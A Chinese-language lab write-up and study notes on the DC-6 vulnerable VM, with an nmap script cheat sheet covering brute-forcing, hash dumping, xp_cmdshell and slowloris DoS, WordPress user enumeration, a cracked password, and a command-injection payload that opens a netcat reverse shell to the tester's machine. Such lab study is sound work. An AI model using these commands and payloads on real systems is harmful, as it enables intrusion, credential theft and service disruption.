<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ok，回到正题，既然可以发现有变量可以动态包含，那我需要利用它，同样抓包，使用失传已久的一句话木马，尝试使用shell工具连接。</span><br></pre></td></tr></table></figure>
<h2 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h2><p>这一关开始有点迷茫；一定要坚持，不要与遗忘曲线作斗争</p>
<h3 id="前置知识-5"><a href="#前置知识-5" class="headerlink" title="前置知识"></a>前置知识</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo 所有命令</span><br><span class="line">wpscan</span><br><span class="line">自带的burp：按照物理机一样配置环境即可</span><br><span class="line">vi&#x2F;vim使用：https:&#x2F;&#x2F;www.runoob.com&#x2F;linux&#x2F;linux-vim.html</span><br><span class="line">linux下的hosts文件：负责ip地址与域名快速解析的文件</span><br></pre></td></tr></table></figure>
<h4 id="linux根目录"><a href="#linux根目录" class="headerlink" title="linux根目录"></a>linux根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bin，它是重要的二进制应用程序，包含二进制文件，系统的所有用户使用的命令都在这里</span><br><span class="line">&#x2F;boot，启动包含引导加载程序的相关文件</span><br><span class="line">&#x2F;dev，包含设备文件，终端文件，USB 或者连接到系统的任何设备</span><br><span class="line">&#x2F;etc，配置文件，启动脚本等，包含所有程序所需要的配置文件，也包含了启动&#x2F;停止单个应用程序的启动和关闭 shell 脚本</span><br><span class="line">&#x2F;home，本地主要路径，所有用户用 home 目录存储个人信息</span><br><span class="line">&#x2F;lib，系统库文件，包含支持位于 &#x2F;bin 和 &#x2F;sbin 下的二进制库文件</span><br><span class="line">&#x2F;lost+found，在根目录下提供一个遗失+查找系统，必须在 root 用户下才能查看当前目录下的内容</span><br><span class="line">&#x2F;media，挂载可移动介质</span><br><span class="line">&#x2F;mnt，挂载文件系统</span><br><span class="line">&#x2F;opt，提供一个可选的应用程序安装目录</span><br><span class="line">&#x2F;proc，特殊的动态目录，用于维护系统信息和状态，包括当前运行中进程信息</span><br><span class="line">&#x2F;root，root 用户的主要目录文件夹</span><br><span class="line">&#x2F;sbin，重要的二进制系统文件</span><br><span class="line">&#x2F;tmp， 系统和用户创建的临时文件，系统重启时，这个目录下的文件都会被删除</span><br><span class="line">&#x2F;usr，包含绝大多数用户都能访问的应用程序和文件</span><br><span class="line">&#x2F;var，经常变化的文件，诸如日志文件或数据库等</span><br><span class="line">在 Linux 中，有两种路径，一种是 绝对路径(absolute path) ，绝对路径告诉你从根目录下查找文件，绝对路径的缺点是太长而且不太方便。还有一种是 相对路径(relative path) ，相对路径所在的目录也叫做工作目录(working directory)。</span><br></pre></td></tr></table></figure>
<h4 id="sudo命令"><a href="#sudo命令" class="headerlink" title="sudo命令"></a>sudo命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">sudo - 以其他用户身份执行一条命令</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">  -A, --askpass                 使用助手程序进行密码提示</span><br><span class="line">  -b, --background              在后台运行命令</span><br><span class="line">  -B, --bell                    提示时响铃</span><br><span class="line">  -C, --close-from&#x3D;num          关闭所有 &gt;&#x3D; num 的文件描述符</span><br><span class="line">  -D, --chdir&#x3D;directory         运行命令前改变工作目录</span><br><span class="line">  -E, --preserve-env            在执行命令时保留用户环境</span><br><span class="line">      --preserve-env&#x3D;list       保留特定的环境变量</span><br><span class="line">  -e, --edit                    编辑文件而非执行命令</span><br><span class="line">  -g, --group&#x3D;group             以指定的用户组或 ID 执行命令</span><br><span class="line">  -H, --set-home                将 HOME 变量设为目标用户的主目录</span><br><span class="line">  -h, --help                    显示帮助消息并退出</span><br><span class="line">  -h, --host&#x3D;host               在主机上运行命令(如果插件支持)</span><br><span class="line">  -i, --login                   以目标用户身份运行一个登录</span><br><span class="line">                                shell；可同时指定一条命令</span><br><span class="line">  -K, --remove-timestamp        完全移除时间戳文件</span><br><span class="line">  -k, --reset-timestamp         无效的时间戳文件</span><br><span class="line">  -l, --list</span><br><span class="line">                              列出用户权限或检查某个特定命令；对于长格式，使用两次</span><br><span class="line">  -n, --non-interactive         非交互模式，不提示</span><br><span class="line">  -P, --preserve-groups         保留组向量，而非设置为目标的组向量</span><br><span class="line">  -p, --prompt&#x3D;prompt           使用指定的密码提示</span><br><span class="line">  -R, --chroot&#x3D;directory        运行命令前改变根目录</span><br><span class="line">  -r, --role&#x3D;role               以指定的角色创建 SELinux 安全环境</span><br><span class="line">  -S, --stdin                   从标准输入读取密码</span><br><span class="line">  -s, --shell                   以目标用户运行</span><br><span class="line">                                shell；可同时指定一条命令</span><br><span class="line">  -t, --type&#x3D;type               以指定的类型创建 SELinux 安全环境</span><br><span class="line">  -T, --command-timeout&#x3D;timeout 在达到指定时间限制后终止命令</span><br><span class="line">  -U, --other-user&#x3D;user         在列表模式中显示用户的权限</span><br><span class="line">  -u, --user&#x3D;user               以指定用户或 ID 运行命令(或编辑文件)</span><br><span class="line">  -V, --version                 显示版本信息并退出</span><br><span class="line">  -v, --validate                更新用户的时间戳而不执行命令</span><br><span class="line">  --                            停止处理命令行参数</span><br></pre></td></tr></table></figure>
<h4 id="nmap常用命令"><a href="#nmap常用命令" class="headerlink" title="nmap常用命令"></a>nmap常用命令</h4><p><a href="https://www.fujieace.com/penetration-test/nmap-scripts-nse.html" target="_blank" rel="noopener">nse脚本</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">不完全，比如ssh口令爆破的命令就没有</span><br><span class="line">格式：</span><br><span class="line">nmap [ &lt;扫描类型&gt; …] [ &lt;选项&gt; ] &#123; &lt;扫描目标说明&gt; &#125;</span><br><span class="line"></span><br><span class="line">常用命令</span><br><span class="line"></span><br><span class="line">全面扫描：nmap-T4 -A targetip</span><br><span class="line">主机发现：nmap-T4 -sn targetip</span><br><span class="line">端口扫描：nmap-T4 targetip</span><br><span class="line">服务扫描：nmap-T4 -sV targetip</span><br><span class="line">操作系统扫描：nmap-T4 -O targetip</span><br><span class="line"></span><br><span class="line">扫描类型</span><br><span class="line"></span><br><span class="line">-sP  只探测主机在线情况</span><br><span class="line">-sS  SYN扫描（隐身扫描）</span><br><span class="line">-ST  TCP扫描</span><br><span class="line">-sU  UDP扫描</span><br><span class="line">-sV  系统版本检测</span><br><span class="line">-O   操作系统识别</span><br><span class="line">–scanflags  指定TCP标识位（设置URG, ACK, PSH,RST,SYN,FIN位）</span><br><span class="line">时序选项</span><br><span class="line"></span><br><span class="line">-T0  偏执的：非常非常慢，用于IDS逃逸</span><br><span class="line">-T1  猥琐的：相当慢，用于IDS逃逸</span><br><span class="line">-T2  有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍</span><br><span class="line">-T3  普通的：默认，根据目标的反应自动调整时间模式</span><br><span class="line">-T4  野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标</span><br><span class="line">-T5  疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口</span><br><span class="line">脚本使用</span><br><span class="line">脚本命令参数</span><br><span class="line">-sC          等价于–script&#x3D;default，使用默认类别的脚本进行扫描 可更换其他类别 </span><br><span class="line">–script&#x3D;&lt;Lua scripts&gt;               &lt;Lua scripts&gt;使用某个或某类脚本进行扫描（基于Lua编程的脚本），支持通配符描述！这里是很强的功能，执行nse脚本！</span><br><span class="line">–script-args&#x3D;&lt;n1&#x3D;v1,[n2&#x3D;v2,...]&gt;    为脚本提供默认参数</span><br><span class="line">–script-args-file&#x3D;filename          使用文件来为脚本提供参数</span><br><span class="line">–script-trace                       显示脚本执行过程中发送与接收的数据</span><br><span class="line">–script-updatedb                    更新脚本数据库</span><br><span class="line">–script-help&#x3D;&lt;scripts&gt;              显示脚本的帮助信息，其中&lt;scripts&gt;部分可以逗号分隔的文件或脚本类别</span><br><span class="line">脚本分类</span><br><span class="line">auth          负责处理鉴权证书（绕开鉴权）绕过目标主机得访问控制的脚本</span><br><span class="line">broadcast     在局域网内探查更多服务开启状况，如dhcp&#x2F;dns&#x2F;sqlserver等服务</span><br><span class="line">brute         提供暴力破解方式，针对常见的应用如http（80，443）&#x2F;snmp&#x2F;ssh（22）等;</span><br><span class="line">	举例：：nmap -p22 --script ssh-brute site.test.lan</span><br><span class="line">default       使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力</span><br><span class="line">discovery     对网络进行更多的信息，如SMB枚举、SNMP查询等</span><br><span class="line">dos           用于进行拒绝服务攻击</span><br><span class="line">exploit       利用已知的漏洞入侵系统</span><br><span class="line">external      利用第三方的数据库或资源，例如进行whois解析</span><br><span class="line">fuzzer        模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS&#x2F;IPS的记录或屏蔽</span><br><span class="line">malware       探测目标机是否感染了病毒、开启了后门等信息</span><br><span class="line">safe          此类与intrusive相反，属于安全性脚本</span><br><span class="line">version       负责增强服务与版本扫描（Version Detection）功能的脚本</span><br><span class="line">vuln          负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</span><br><span class="line">按脚本分类扫描</span><br><span class="line"># 负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</span><br><span class="line">nmap --script&#x3D;auth 192.168.137.*</span><br><span class="line"></span><br><span class="line"># 提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解</span><br><span class="line">nmap --script&#x3D;brute 192.168.137.*</span><br><span class="line"></span><br><span class="line"># 默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</span><br><span class="line">nmap --script&#x3D;default 192.168.137.* 或者 nmap -sC 192.168.137.*</span><br><span class="line"></span><br><span class="line"># 检查是否存在常见漏洞</span><br><span class="line">nmap --script&#x3D;vuln 192.168.137.*   </span><br><span class="line"></span><br><span class="line"># 在局域网内探查更多服务开启状况</span><br><span class="line">nmap -n -p445 --script&#x3D;broadcast 192.168.137.4</span><br><span class="line"></span><br><span class="line"># 利用第三方的数据库或资源，例如进行whois解析</span><br><span class="line">nmap --script external 202.103.243.110</span><br><span class="line">按应用服务扫描</span><br><span class="line">vnc扫描：</span><br><span class="line">检查vnc bypass</span><br><span class="line">nmap –script&#x3D;realvnc-auth-bypass 192.168.137.4</span><br><span class="line"></span><br><span class="line">检查vnc认证方式</span><br><span class="line">nmap –script&#x3D;vnc-auth 192.168.137.4</span><br><span class="line"></span><br><span class="line">获取vnc信息</span><br><span class="line">nmap –script&#x3D;vnc-info 192.168.137.4</span><br><span class="line"></span><br><span class="line">smb扫描：</span><br><span class="line">smb破解</span><br><span class="line">nmap –script&#x3D;smb-brute.nse -p445 192.168.137.4</span><br><span class="line"></span><br><span class="line">smb字典破解</span><br><span class="line">nmap –script&#x3D;smb-brute.nse –script-args&#x3D;userdb&#x3D;&#x2F;var&#x2F;passwd,passdb&#x3D;&#x2F;var&#x2F;passwd 192.168.137.4</span><br><span class="line"></span><br><span class="line">smb已知几个严重漏</span><br><span class="line">nmap –script&#x3D;smb-check-vulns.nse –script-args&#x3D;unsafe&#x3D;1 192.168.137.4</span><br><span class="line"></span><br><span class="line">查看共享目录</span><br><span class="line">nmap -p 445 –script smb-ls –script-args ‘share&#x3D;e$,path&#x3D;\,smbuser&#x3D;test,smbpass&#x3D;test’ 192.168.137.4</span><br><span class="line"></span><br><span class="line">smb-psexec: 用登陆凭据作为脚本参数，在目标机器上运行一系列程序（注：需要下载nmap_service）</span><br><span class="line">nmap –script smb-psexec.nse –script-args&#x3D;smbuser&#x3D;,smbpass&#x3D;[,config&#x3D;] -p445</span><br><span class="line"></span><br><span class="line">查看会话</span><br><span class="line">nmap -n -p445 –script&#x3D;smb-enum-sessions.nse –script-args&#x3D;smbuser&#x3D;test,smbpass&#x3D;test 192.168.137.4</span><br><span class="line"></span><br><span class="line">系统信息</span><br><span class="line">nmap -n -p445 –script&#x3D;smb-os-discovery.nse –script-args&#x3D;smbuser&#x3D;test,smbpass&#x3D;test 192.168.137.4</span><br><span class="line"></span><br><span class="line">Mssql扫描：</span><br><span class="line">猜解mssql用户名和密码</span><br><span class="line">nmap -p1433 –script&#x3D;ms-sql-brute –script-args&#x3D;userdb&#x3D;&#x2F;var&#x2F;passwd,passdb&#x3D;&#x2F;var&#x2F;passwd 192.168.137.4</span><br><span class="line"></span><br><span class="line">xp_cmdshell 执行命令</span><br><span class="line">nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username&#x3D;sa,mssql.password&#x3D;sa,ms-sql-xp-cmdshell.cmd&#x3D;”net user” 192.168.137.4</span><br><span class="line"></span><br><span class="line">dumphash值</span><br><span class="line">nmap -p 1433 –script ms-sql-dump-hashes.nse –script-args mssql.username&#x3D;sa,mssql.password&#x3D;sa 192.168.137.4</span><br><span class="line"></span><br><span class="line">Mysql扫描：</span><br><span class="line">检查mysql空密码</span><br><span class="line">nmap -p 3306 –script&#x3D;mysql-empty-password.nse 192.168.1.114</span><br><span class="line"></span><br><span class="line">如果没有空密码，则可以使用自带的暴力破解功能尝试破解</span><br><span class="line">nmap -p 3306 –script&#x3D;mysql-brute.nse 192.168.1.114</span><br><span class="line"></span><br><span class="line">如果知道了用户名与密码，可以枚举数据库中的用户</span><br><span class="line">nmap -p 3306 –script&#x3D;mysql-users.nse –script-args&#x3D;mysqluser&#x3D;root 192.168.1.114</span><br><span class="line"></span><br><span class="line">枚举mysql用户信息</span><br><span class="line">nmap -p 3306 –script&#x3D;mysql-enum.nse 192.168.1.114</span><br><span class="line"></span><br><span class="line">支持同一应用的所有脚本扫描</span><br><span class="line">nmap –script&#x3D;mysql-* 192.168.137.4</span><br><span class="line"></span><br><span class="line">Oracle扫描：</span><br><span class="line">oracle sid扫描</span><br><span class="line">nmap –script&#x3D;oracle-sid-brute -p 1521-1560 192.168.137.5</span><br><span class="line"></span><br><span class="line">oracle弱口令破解</span><br><span class="line">nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid&#x3D;ORCL,userdb&#x3D;&#x2F;var&#x2F;passwd,passdb&#x3D;&#x2F;var&#x2F;passwd 192.168.137.5</span><br><span class="line"></span><br><span class="line">其他一些比较好用的脚本</span><br><span class="line">nmap –script&#x3D;broadcast-netbios-master-browser 192.168.137.4 发现网关</span><br><span class="line">nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module&#x3D;www’ 192.168.137.4 破解rsync</span><br><span class="line">nmap –script informix-brute -p 9088 192.168.137.4 informix数据库破解</span><br><span class="line">nmap -p 5432 –script pgsql-brute 192.168.137.4 pgsql破解</span><br><span class="line">nmap -sU –script snmp-brute 192.168.137.4 snmp破解</span><br><span class="line">nmap -sV –script&#x3D;telnet-brute 192.168.137.4 telnet破解</span><br><span class="line">nmap –script&#x3D;http-vuln-cve2010-0738 –script-args ‘http-vuln-cve2010-0738.paths&#x3D;&#123;&#x2F;path1&#x2F;,&#x2F;path2&#x2F;&#125;’ jboss autopwn</span><br><span class="line">nmap –script&#x3D;http-methods.nse 192.168.137.4 检查http方法</span><br><span class="line">nmap –script http-slowloris –max-parallelism 400 192.168.137.4 dos攻击，对于处理能力较小的站点还挺好用的 ‘half-HTTP’ connections</span><br><span class="line">nmap –script&#x3D;samba-vuln-cve-2012-1182 -p 139 192.168.137.4</span><br><span class="line"></span><br><span class="line">不靠谱的脚本：</span><br><span class="line">vnc-brute 次数多了会禁止连接</span><br><span class="line">pcanywhere-brute 同上</span><br></pre></td></tr></table></figure>
<h4 id="Wpscan："><a href="#Wpscan：" class="headerlink" title="Wpscan："></a><a href="https://cloud.tencent.com/developer/article/1684063" target="_blank" rel="noopener">Wpscan：</a></h4><p><strong>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</strong>但是我看到说国外的wordpress禁止该工具扫。</p>
<h4 id="linux下的提权"><a href="#linux下的提权" class="headerlink" title="linux下的提权"></a><a href="https://www.cnblogs.com/csnd/p/11807585.html#Bash%E5%8F%8D%E5%BC%B9shell" target="_blank" rel="noopener">linux下的提权</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">系统内核是什么？</span><br><span class="line">shell又是啥？shell与内核又是啥关系？</span><br><span class="line">bash是linux下的啥？</span><br><span class="line">为啥可以用于提权?</span><br><span class="line">linux提权是啥？</span><br></pre></td></tr></table></figure>
<h5 id="系统内核"><a href="#系统内核" class="headerlink" title="系统内核"></a>系统内核</h5><p><strong>是一个操作</strong>系统<strong>的核心。 是基于硬件的第一层软件扩充，提供操作</strong>系统<strong>的最基本的功能，是操作</strong>系统<strong>工作的基础，它负责管理</strong>系统<strong>的进程、内存、设备驱动程序、文件和网络</strong>系统<strong>，决定着</strong>系统**的性能和稳定性。</p>
<h5 id="shell是啥？"><a href="#shell是啥？" class="headerlink" title="shell是啥？"></a>shell是啥？</h5><p>shell是操纵系统的外壳，<strong>用于外界使用操作系统的接口</strong>， <strong>是</strong>用户和<strong>Linux</strong>内核之间的接口程序，<strong>是</strong>与linux沟通的桥梁，<strong>是</strong>命令语言、命令解释程序及程序设计语言的统称。shell有很多种：sh，bash，csh，ksh，zsh。<a href="https://blog.51cto.com/u_15232351/3189859" target="_blank" rel="noopener">shell语法理解</a>干活满满。</p>
<p>shell与内核关系：</p>
<p><img src="https://s2.loli.net/2021/12/13/sGDBUhrOHXdV5Je.png" alt="image-20211213110511456"></p>
<h5 id="bash是啥？"><a href="#bash是啥？" class="headerlink" title="bash是啥？"></a><a href="https://blog.csdn.net/sujz12345/article/details/54565056?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.highlightwordscore&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.highlightwordscore" target="_blank" rel="noopener">bash是啥？</a></h5><p>是linux默认的标准shell，也是linux上常见的shell脚本解释器；<strong>脚本解释器？</strong>脚本语言就是用脚本解释器，JS，py，php都是捏，也叫做解释型语言，像C#，C++就是编译型语言。<strong>pycharm般的存在</strong>。很多种用途，看了一遍很懵，过几天再看看。</p>
<p>后续完善，带着问题继续探究</p>
<hr>
<h3 id="DC-6实操"><a href="#DC-6实操" class="headerlink" title="DC-6实操"></a>DC-6实操</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正常走步骤， 设置靶机为NAT模式，扫描网段存活主机：arp-scan -l</span><br><span class="line">发现192.168.136.136</span><br><span class="line">nmap -sV 192.168.136.136		&#x2F;&#x2F;可以发现80与22端口开，很显然，又是进去之后再ssh另外一个user然后花样提权</span><br><span class="line">点击发现根本就没有回显啊！但是却ping得通（当主机是使用linux时，ping得TTL&lt;68还是多少，如果是windows的话是TTL&gt;120，有待精确）</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/BFULEqQC2VjJ1XT.png" alt="image-20211212233556710"></p>
<p>然后我再ping，发现根本就是说本地解析出了问题</p>
<p><img src="https://s2.loli.net/2021/12/12/rCdxWe1JltSy5jn.png" alt="image-20211212233709836"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找教程，你妈妈的，结果说是修改hosts文件，很多时候我都是懵逼的关于linux文件目录。于是我按照修改：</span><br><span class="line">vim &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/Ea9scfkgYOxLFw3.png" alt="image-20211212233134958"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">然后就打开了，emm这个ip转到wordy这个url，但是这个url解析得到的ip却不是靶机（计网没学好，我是这么理解的）</span><br><span class="line">访问后，一点头绪都没，胡乱点，</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/ItEU21lYskAq6KG.png" alt="image-20211212233818841"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">经过提示，下标瞩目</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/MV9dEIlJrhbRaez.png" alt="image-20211212233912911"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">worldpress &#x3D; wpscan ，听说这个太厉害，国外很多wp站都搞了防火墙防扫了</span><br><span class="line">遂查找使用方法，wpscan --url http:&#x2F;&#x2F;wordy&#x2F; -e u          	&#x2F;&#x2F;后门两个参数参考前置知识，e：枚举，u：usename，这个url可不是ip！</span><br><span class="line">好的，得到这几个b</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/UxjZdYmDX4MlqVB.png" alt="image-20211212234544270"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">翻了翻网站，也没有地方登录啊！才想起来，信息收集还没子域名爆破，果断：</span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.136.136  	&#x2F;&#x2F;当然url也可</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/B2Q1J8Omw3bRZgT.png" alt="image-20211212235226870"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">来到后台管理，又开始拼字典咯</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/e2ycpoMnBjLfE4I.png" alt="image-20211212235337654"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆破每一个b，得到mark爆出密码：helpdesk01</span><br><span class="line">好的，咱就是一整个进去了</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/mqFszXWfihRHn7u.png" alt="image-20211212235507295"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">仍然没有头绪，看了教程：插件漏洞！Activity monitor远程执行漏洞</span><br><span class="line">对于漏洞，可以使用kali的漏洞库查一下：</span><br><span class="line">searchsploit ~</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/ID8GExVliKjFzHu.png" alt="image-20211212235652587"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp 到桌面或者你待会找得到的地方，然后vi&#x2F;vim&#x2F;cat：这个漏洞是过滤不严格，在tools模块下，提交表单的地方可以输入高权限命令</span><br><span class="line">127.0.0.1 | ls		&#x2F;&#x2F;然后点击look up而不死convert</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/hIxCZF54GR9jyDM.png" alt="image-20211213100758939"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">素质三连到时候，发现限制了长度，那就抓包，kali自带bp，所以可以直接使用</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/263YIu8yFvfoOX5.png" alt="image-20211213101021515"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考漏洞说明，直接反弹shell</span><br><span class="line">漏洞库等在 &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F; 下，好好看看以后</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/9TZ4ucQOLqUKExI.png" alt="image-20211213101643970"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">那就直接在bp反弹：</span><br><span class="line">127.0.0.1 | nc -e &#x2F;bin&#x2F;bash 192.168.136.128 666</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/g6VxTdSF7PwjBGY.png" alt="image-20211213101858671"></p>
